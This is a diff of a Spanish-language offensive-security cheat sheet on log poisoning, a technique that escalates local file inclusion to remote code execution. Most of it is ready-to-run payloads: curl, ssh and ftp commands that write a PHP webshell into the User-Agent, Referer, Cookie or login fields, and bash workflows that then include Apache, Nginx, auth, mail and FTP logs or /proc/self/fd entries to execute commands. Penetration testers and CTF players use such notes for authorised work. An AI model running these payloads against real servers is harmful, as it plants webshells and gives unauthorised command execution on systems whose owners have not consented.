@@ -1,43 +1,98 @@
 ---
 aliases:
-  - "Log Poisoning"
+  - Log Poisoning
 tags:
   - type/technique
   - vuln/lfi
   - technique/execution
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[File Inclusion]]"
+  - '[[File Inclusion]]'
 ---
-# LFI To RCE - Log Poisoning 
+# LFI To RCE - Log Poisoning
 
 ***
 
 ## Cheatsheet
 
-|                **Técnica**                 |                               **Descripción**                               |                                      **Payload**                                      |
-| :----------------------------------------: | :-------------------------------------------------------------------------: | :-----------------------------------------------------------------------------------: |
-|         <br>**Apache access log**          |   <br>Inyectar código PHP en el User-Agent y luego incluir el access log    | <br>UA: `<?php system($_GET['cmd']); ?>` → LFI: `/var/log/apache2/access.log`<br><br> |
-|          <br>**Apache error log**          | <br>Provocar un error con código PHP en la URL y luego incluir el error log |  <br>Request a `<?php system('id'); ?>` → LFI: `/var/log/apache2/error.log`<br><br>   |
-|          <br>**Nginx access log**          |              <br>Mismo concepto pero apuntando a logs de Nginx              |      <br>UA: `<?php system('id'); ?>` → LFI: `/var/log/nginx/access.log`<br><br>      |
-|          <br>**Nginx error log**           |                <br>Provocar errores con payload PHP en Nginx                |                      <br>LFI: `/var/log/nginx/error.log`<br><br>                      |
-|            <br>**SSH auth log**            |         <br>Intentar login SSH con usuario que contenga código PHP          |     <br>`ssh '<?php system("id"); ?>'@target` → LFI: `/var/log/auth.log`<br><br>      |
-|              <br>**Mail log**              |           <br>Enviar un mail con código PHP en el campo de datos            |                <br>SMTP con payload → LFI: `/var/log/mail.log`<br><br>                |
-|              <br>**FTP log**               |         <br>Intentar login FTP con usuario que contenga código PHP          |     <br>Login como `<?php system('id'); ?>` → LFI: `/var/log/vsftpd.log`<br><br>      |
-|            <br>**Proc self fd**            | <br>Acceder a file descriptors del proceso en vez de rutas de log estáticas |                      <br>LFI: `/proc/self/fd/2` (stderr)<br><br>                      |
-| <br>**Envenenamiento vía Referer**<br><br> |                <br>Inyectar código PHP en el header Referer                 |          <br>Referer: `<?php system('id'); ?>` → incluir access log<br><br>           |
-| <br>**Envenenamiento vía Cookie**<br><br>  |             <br>Inyectar código PHP en una cookie personalizada             |           <br>Cookie: `<?php system('id'); ?>` → incluir access log<br><br>           |
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `curl -A '<?php system($_GET["cmd"]); ?>' https://target/` luego `?page=/var/log/apache2/access.log&cmd=id` | Apache access log con webshell PHP inyectado | Apache standard. Webserver legible su access.log. |
+| `curl -A '<?php system($_GET["cmd"]); ?>' https://target/` luego `?page=/var/log/nginx/access.log&cmd=id` | Nginx access log con webshell | Stack Nginx. |
+| `curl -e '<?php system($_GET["cmd"]); ?>' https://target/` (Referer header) luego incluir log | Inyección via Referer en vez de UA | App o WAF que filtra User-Agent. |
+| `ssh '<?php system("id"); ?>'@target` (login falla pero queda loggeado) luego `?page=/var/log/auth.log` | SSH auth log con username PHP | Webserver con permisos sobre `/var/log/auth.log`. |
+| `curl -X POST -H "Cookie: poison=<?php system('id'); ?>" https://target/` luego incluir log | Cookie injection en log | Cookie reflejada en access log. |
+| `curl 'https://target/<?php system("id"); ?>'` (URL con PHP literal) luego `?page=/var/log/apache2/error.log` | URL inválida → log de error con payload | Errores se loggean con request raw. |
+| `ftp $TARGET` → login con user `<?php system($_GET["cmd"]); ?>` → `?page=/var/log/vsftpd.log` | FTP log poisoning | App con FTP + LFI alcanza vsftpd.log. |
+| Mail con `<?php system("id"); ?>` en From → `?page=/var/log/mail.log` | Mail log poisoning | App con MTA local + LFI. |
+| `?page=/proc/self/fd/2` (stderr del web process) | File descriptor del stderr = error log actual | Acceso a logs sin saber path exacto. |
+| `?page=/proc/[PID]/fd/X` (iterar PIDs/FDs) | Mismo, file descriptors específicos | Path del log desconocido. |
+| `?page=/var/log/auth.log` después de `for i in 1 2 3; do ssh "<?php system('id'); ?>"@target; done` | Confirmar log poisoning con retry | Log rotation o buffering. |
 ^lfi-logpoisoning
 
-***
+### Workflow Apache
+
+```bash
+TARGET="https://target/?page="
+INCLUDE="$TARGET/var/log/apache2/access.log&cmd=id"
+
+# 1. Inyectar PHP en access log via User-Agent
+curl -s -A '<?php system($_GET["cmd"]); ?>' https://target/
+
+# 2. Incluir log via LFI
+curl -s "$INCLUDE"
+# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# 3. Si access.log no es legible, probar:
+for log in '/var/log/apache2/access.log' '/var/log/apache2/error.log' \
+           '/var/log/nginx/access.log' '/var/log/httpd/access_log' \
+           '/var/log/auth.log' '/var/log/syslog' '/var/log/mail.log' \
+           '/proc/self/fd/0' '/proc/self/fd/1' '/proc/self/fd/2'; do
+  echo "=== $log ==="
+  curl -s "${TARGET}${log}" | head -5
+done
+```
+
+### Workflow SSH auth.log
+
+```bash
+# 1. Setup PHP en username de SSH (login falla)
+ssh -o StrictHostKeyChecking=no '<?php system($_GET["cmd"]); ?>'@target.com 2>&1
+# auth.log registra: "Invalid user <?php system... from <IP>"
+
+# 2. Incluir auth.log
+curl "https://target/?page=/var/log/auth.log&cmd=id"
+```
+
+### Paths de logs por stack
+
+| Stack | Path típico |
+|:---:|:---:|
+| Apache (Debian) | `/var/log/apache2/access.log`, `error.log` |
+| Apache (RHEL) | `/var/log/httpd/access_log`, `error_log` |
+| Nginx | `/var/log/nginx/access.log`, `error.log` |
+| FTP (vsftpd) | `/var/log/vsftpd.log` |
+| FTP (proftpd) | `/var/log/proftpd/proftpd.log` |
+| SSH | `/var/log/auth.log` (Debian), `/var/log/secure` (RHEL) |
+| Mail | `/var/log/mail.log`, `/var/log/maillog` |
+| Sys | `/var/log/syslog`, `/var/log/messages` |
+| File descriptors | `/proc/self/fd/0`, `1`, `2` (stdin/stdout/stderr) |
+
+___
 
 ## Overview
 
-Log poisoning convierte un LFI de lectura de archivos en ejecución de código. La idea es simple: primero inyectás código PHP en algún archivo de log del servidor (a través de headers HTTP, intentos de login, o cualquier input que quede registrado), y después usás el LFI para incluir ese log, haciendo que PHP ejecute el código inyectado. El principal desafío es encontrar la ruta exacta del archivo de log (varía según distribución y configuración) y que el usuario del servidor web tenga permisos de lectura sobre ese archivo. Es una técnica muy usada en CTFs y en pentesting real cuando no hay otro camino a RCE.
+Log poisoning convierte LFI en RCE inyectando PHP en cualquier file que el webserver pueda incluir. Headers HTTP (User-Agent, Referer, Cookie) terminan en access logs textualmente — si el server incluye ese log, ejecuta el PHP.
 
+**Pre-requisitos:**
+1. LFI confirmado con lectura del archivo de log.
+2. Webserver user con permisos read sobre el log.
+3. Función vulnerable es `include`/`require` (ejecuta), no `file_get_contents` (solo lee).
+
+**Si el log rota o es muy grande**, el PHP puede quedar en una rotación previa o ser fuera de la primera 1MB de read — usar payloads cortos y específicos.
 
 ***
